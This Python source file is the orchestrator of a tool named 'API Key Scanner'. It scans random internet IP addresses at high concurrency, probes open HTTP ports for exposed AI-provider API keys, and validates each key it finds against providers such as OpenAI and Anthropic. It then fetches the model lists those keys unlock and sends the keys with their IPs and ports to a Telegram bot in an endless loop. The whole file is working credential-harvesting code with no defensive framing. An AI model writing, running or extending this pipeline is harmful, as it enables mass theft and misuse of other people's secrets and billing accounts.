"""
Orchestrator — master controller wiring IP generation → scanning → probing → validation → Telegram.
Designed for maximum throughput with configurable parallelism.
"""
import asyncio
import logging
import os
import time
import signal
from typing import Optional

from ip_generator import IPGenerator
from port_scanner import PortScanner, TARGET_PORTS
from http_probe import HTTPProbe, KeyValidator, FoundKey
from telegram_bot import TelegramNotifier

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("orchestrator")


class APIKeyScanner:
    """Master scanner orchestrator."""

    def __init__(
        self,
        target_ports: list[int] = None,
        scan_timeout: float = 1.5,
        http_timeout: float = 5.0,
        max_concurrent_scans: int = 300,
        max_concurrent_probes: int = 50,
        ips_per_batch: int = 100,
        stats_interval_mins: int = 30,
        use_telegram: bool = True,
    ):
        self.target_ports = target_ports or TARGET_PORTS
        self.ips_per_batch = ips_per_batch
        self.stats_interval = stats_interval_mins * 60
        self.use_telegram = use_telegram

        # Components
        self.ip_gen = IPGenerator()
        self.port_scanner = PortScanner(
            timeout=scan_timeout,
            max_concurrent=max_concurrent_scans,
        )
        self.http_probe = HTTPProbe(
            timeout=http_timeout,
            max_concurrent=max_concurrent_probes,
        )
        self.key_validator = KeyValidator(timeout=10.0)
        self.telegram = TelegramNotifier() if use_telegram else None

        # Stats
        self.ips_scanned = 0
        self.ports_found = 0
        self.keys_found = 0
        self.keys_valid = 0
        self.start_time: Optional[float] = None
        self._running = False

    async def process_ip(self, ip: str):
        """Full lifecycle for a single IP: scan → probe → validate → notify."""
        try:
            # Step 1: Port scan
            open_ports = await self.port_scanner.scan_ip_fast(ip)
            if not open_ports:
                return

            self.ports_found += len(open_ports)

            # Step 2: HTTP probe all open ports for keys
            all_keys = []
            for port in open_ports:
                keys = await self.http_probe.probe_ip_port(ip, port)
                all_keys.extend(keys)

            if not all_keys:
                return

            self.keys_found += len(all_keys)
            logger.info(f"Found {len(all_keys)} key(s) on {ip}")

            # Step 3: Validate keys
            valid_keys = await self.key_validator.validate_batch(all_keys)
            for vk in valid_keys:
                self.keys_valid += 1
                logger.info(f"✅ VALID {vk.provider} key on {ip}:{vk.source_port}")

                # Step 4: Get models list if possible
                models = await self._fetch_models(vk)

                # Step 5: Notify via Telegram
                if self.telegram:
                    await self.telegram.notify_key_found(
                        provider=vk.provider,
                        key=vk.key,
                        ip=vk.source_ip,
                        port=vk.source_port,
                        endpoint=vk.endpoint,
                        models=models,
                        validated=True,
                    )
        except Exception as e:
            logger.debug(f"Error processing {ip}: {e}")

    async def _fetch_models(self, key: FoundKey) -> Optional[list[str]]:
        """Fetch available models for a validated key."""
        from http_probe import VALIDATION_ENDPOINTS

        if key.provider not in VALIDATION_ENDPOINTS:
            return None

        config = VALIDATION_ENDPOINTS[key.provider]
        url = config["url"]
        if "{key}" in url:
            url = url.format(key=key.key)
        headers = config["headers"](key.key)

        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=10),
                                       ssl=True) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return self._extract_model_names(data, key.provider)
        except Exception:
            return None

    def _extract_model_names(self, data: dict, provider: str) -> list[str]:
        """Extract model names from API response based on provider."""
        try:
            if provider == "OpenAI" and "data" in data:
                return [m["id"] for m in data["data"][:125]]
            elif provider == "Gemini" and "models" in data:
                return [m["name"].replace("models/", "") for m in data["models"][:125]]
            elif provider == "OpenRouter" and "data" in data:
                return [m["id"] for m in data.get("data", {}).get("models", [])[:20]]
            elif provider == "DeepSeek" and "data" in data:
                return [m["id"] for m in data["data"][:20]]
            elif provider == "Anthropic" and "data" in data:
                return [m["id"] for m in data["data"][:20]]
            elif provider == "HuggingFace" and isinstance(data, list):
                return [m["modelId"] for m in data[:20]]
            elif provider == "TogetherAI" and "data" in data:
                return [m["id"] for m in data.get("data", [])[:20]]
            elif provider == "Groq" and "data" in data:
                return [m["id"] for m in data["data"][:20]]
            elif provider == "Mistral" and "data" in data:
                return [m["id"] for m in data.get("data", [])[:20]]
        except Exception:
            pass
        return None

    async def scan_batch(self, count: int = None):
        """Scan a batch of IPs."""
        if count is None:
            count = self.ips_per_batch

        # Generate IPs
        ips = self.ip_gen.batch_ips(count)
        self.ips_scanned += len(ips)

        # Process in parallel (throttled by semaphore inside scanners)
        tasks = [self.process_ip(ip) for ip in ips]
        await asyncio.gather(*tasks)

    async def stats_report(self):
        """Send periodic stats to Telegram."""
        if not self.telegram or not self.start_time:
            return

        elapsed = (time.time() - self.start_time) / 3600
        await self.telegram.notify_stats(
            ips_scanned=self.ips_scanned,
            keys_found=self.keys_found,
            keys_valid=self.keys_valid,
            elapsed_hours=elapsed,
        )

    async def run(self, endless: bool = True):
        """Main run loop."""
        self._running = True
        self.start_time = time.time()
        last_stats = time.time()

        # Handle graceful shutdown (signal handlers work on Linux/Render)
        if os.name != 'nt':  # Not on Windows
            loop = asyncio.get_event_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                try:
                    loop.add_signal_handler(sig, lambda: asyncio.ensure_future(self.shutdown()))
                except NotImplementedError:
                    pass

        logger.info("=" * 60)
        logger.info("API Key Scanner v1.0.0 — Starting")
        logger.info(f"Target ports: {len(self.target_ports)}")
        logger.info(f"Batch size: {self.ips_per_batch}")
        logger.info("=" * 60)

        if self.telegram:
            await self.telegram.notify_startup()

        try:
            while self._running:
                batch_start = time.time()

                # Process a batch of IPs
                await self.scan_batch(self.ips_per_batch)

                # Stats
                elapsed = time.time() - self.start_time
                rate = self.ips_scanned / max(elapsed, 1)
                logger.info(
                    f"Scanned: {self.ips_scanned:,} | "
                    f"Keys: {self.keys_found} | "
                    f"Valid: {self.keys_valid} | "
                    f"Rate: {rate:.0f}/s"
                )

                # Periodic Telegram stats
                if self.telegram and (time.time() - last_stats) >= self.stats_interval:
                    await self.stats_report()
                    last_stats = time.time()

                if not endless:
                    break

        except asyncio.CancelledError:
            logger.info("Scan cancelled")
        finally:
            await self.cleanup()

    async def shutdown(self):
        """Graceful shutdown."""
        logger.info("Shutting down...")
        self._running = False

    async def cleanup(self):
        """Cleanup resources."""
        elapsed = (time.time() - self.start_time) / 3600 if self.start_time else 0
        logger.info(f"Run complete: {self.ips_scanned:,} IPs, {self.keys_valid} valid keys in {elapsed:.1f}h")

        if self.telegram:
            await self.telegram.notify_stats(
                ips_scanned=self.ips_scanned,
                keys_found=self.keys_found,
                keys_valid=self.keys_valid,
                elapsed_hours=elapsed,
            )
            await self.telegram.close()

        logger.info("Cleanup done.")


async def main():
    """Entry point."""
    # Render-friendly configuration via env vars
    import os

    scanner = APIKeyScanner(
        scan_timeout=float(os.getenv("SCAN_TIMEOUT", "1.0")),
        http_timeout=float(os.getenv("HTTP_TIMEOUT", "4.0")),
        max_concurrent_scans=int(os.getenv("MAX_CONCURRENT_SCANS", "2000")),
        max_concurrent_probes=int(os.getenv("MAX_CONCURRENT_PROBES", "200")),
        ips_per_batch=int(os.getenv("IPS_PER_BATCH", "500")),
        stats_interval_mins=int(os.getenv("STATS_INTERVAL_MIN", "15")),
        use_telegram=os.getenv("USE_TELEGRAM", "true").lower() == "true",
    )

    await scanner.run(endless=True)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
